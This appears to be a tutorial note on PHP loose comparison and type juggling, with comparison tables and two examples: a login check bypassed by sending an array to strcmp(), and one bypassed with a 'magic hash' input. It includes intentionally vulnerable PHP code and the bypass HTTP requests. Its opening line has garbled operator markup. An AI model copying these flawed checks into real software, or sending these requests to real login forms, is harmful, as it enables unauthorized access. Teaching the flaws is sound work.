# Loose comparison - PHP
In PHP, **loose comparison** is when you use `<mark>`, and **strict comparison** is `</mark>=`. 
```php
if("10" == 10){
	echo "loose comparison"
}
if("10" === 10){
	echo "strict comparison"
}
```
The comparison of `"10" == 10` results in type juggling, which converts `"10"` to `10`, and do comparison on them.
However, `"10" === 10` will also compare data type, hence strict comparison.
The behavior of type juggling in a comparison context is documented [here](https://www.php.net/manual/en/language.operators.comparison.php#language.operators.comparison.types), shorten to this table:

| Operand 1 | Operand 2             | Behavior                        |
| --------- | --------------------- | ------------------------------- |
| `string`  | `string`              | Numerical or lexical comparison |
| `null`    | `string`              | Convert `null` to `""`          |
| `null`    | anything but `string` | Convert both sides to `bool`    |
| `bool`    | anything              | Convert both sides to `bool`    |
| `int`     | `string`              | Convert `string` to `int`       |
| `float`   | `string`              | Convert `string` to `float`     |
For example:
- `10 == "10asd"` returns `true`. `int` and `string` loose comparison converts `string` to `int` first, and `"10asd"` gets converted into `10`
- `min(-1, null, 1)` returns `null`, since both `int` are compared to a `null`, it all get converted to bool. So the comparison basically is `min(true, false, true)`
- `"00" == "0e123"` returns `true`. According to the [doc](https://www.php.net/manual/en/language.types.float.php), `e` in the second string is the scientific notation for floats. Since both sides can be converted to number, it converts both to `int`, and `0 = 0`
Here's some cheatsheet for type juggling:

|         | `true` | `false` | `1` | `0`             | `-1` | `"1"` | `"0"` | `"-1"` | `null` | `[]` | `"php"`         | `""`            |
| ------- | ------ | ------- | --- | --------------- | ---- | ----- | ----- | ------ | ------ | ---- | --------------- | --------------- |
| `true`  | ✓      | ✗       | ✓   | ✗               | ✓    | ✓     | ✗     | ✓      | ✗      | ✗    | ✓               | ✓               |
| `false` | ✗      | ✓       | ✗   | ✓               | ✗    | ✗     | ✓     | ✗      | ✓      | ✓    | ✗               | ✓               |
| `1`     | ✓      | ✗       | ✓   | ✗               | ✗    | ✓     | ✗     | ✗      | ✗      | ✗    | ✗               | ✗               |
| `0`     | ✗      | ✓       | ✗   | ✓               | ✗    | ✗     | ✓     | ✗      | ✓      | ✗    | ✓ (< PHP 8.0.0) | ✓ (< PHP 8.0.0) |
| `-1`    | ✓      | ✗       | ✗   | ✗               | ✓    | ✗     | ✗     | ✓      | ✗      | ✗    | ✗               | ✗               |
| `"1"`   | ✓      | ✗       | ✓   | ✗               | ✗    | ✓     | ✗     | ✗      | ✗      | ✗    | ✗               | ✗               |
| `"0"`   | ✗      | ✓       | ✗   | ✓               | ✗    | ✗     | ✓     | ✗      | ✗      | ✗    | ✗               | ✗               |
| `"-1"`  | ✓      | ✗       | ✗   | ✗               | ✓    | ✗     | ✗     | ✓      | ✗      | ✗    | ✗               | ✗               |
| `null`  | ✗      | ✓       | ✗   | ✓               | ✗    | ✗     | ✗     | ✗      | ✓      | ✓    | ✗               | ✓               |
| `[]`    | ✗      | ✓       | ✗   | ✗               | ✗    | ✗     | ✗     | ✗      | ✓      | ✓    | ✗               | ✗               |
| `"php"` | ✓      | ✗       | ✗   | ✓ (< PHP 8.0.0) | ✗    | ✗     | ✗     | ✗      | ✗      | ✗    | ✓               | ✗               |
| `""`    | ✗      | ✓       | ✗   | ✓ (< PHP 8.0.0) | ✗    | ✗     | ✗     | ✗      | ✓      | ✗    | ✗               | ✓               |
Here's the [JS doc](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness) for loose comparison.
# Example 1 - PHP Auth bypass
In this code snippet, it uses `strcmp()` on `pw` `POST` parameter and the hard-coded admin password.
However, it loosely compare the result of `strcmp()` to `0`
```php
$admin_pw = "P@ssw0rd!";

if(isset($_POST['pw'])){
    if(strcmp($_POST['pw'], $admin_pw) == 0){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```
`strcmp()` will return `0` if 2 strings match. However, it will return `null` if we supply a `array` type variable. And `null == 0` is `true`. So we can bypass auth like this
```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

pw[]=asd
```
# Example 2 - PHP magic hash
In this code snippet, the password is hashed before loosely compared to the hard-coded hashed password
```php
$hashed_password = '0e66298694359207596086558843543959518835691168370379069085301337';

if(isset($_POST['pw']) and is_string($_POST['pw'])){ 
    if(hash('sha256', $_POST['pw']) == $hashed_password){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```
However, the hard-coded hashed password is in a very convenient format for us. `0e66...` in loose comparison effectively means `0`
We have a handy [`github` page](https://github.com/spaze/hashes/blob/master/sha256.md) that collects all the `PHP` magic hash, so we just go in and grab some
```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

pw=34250003024812
```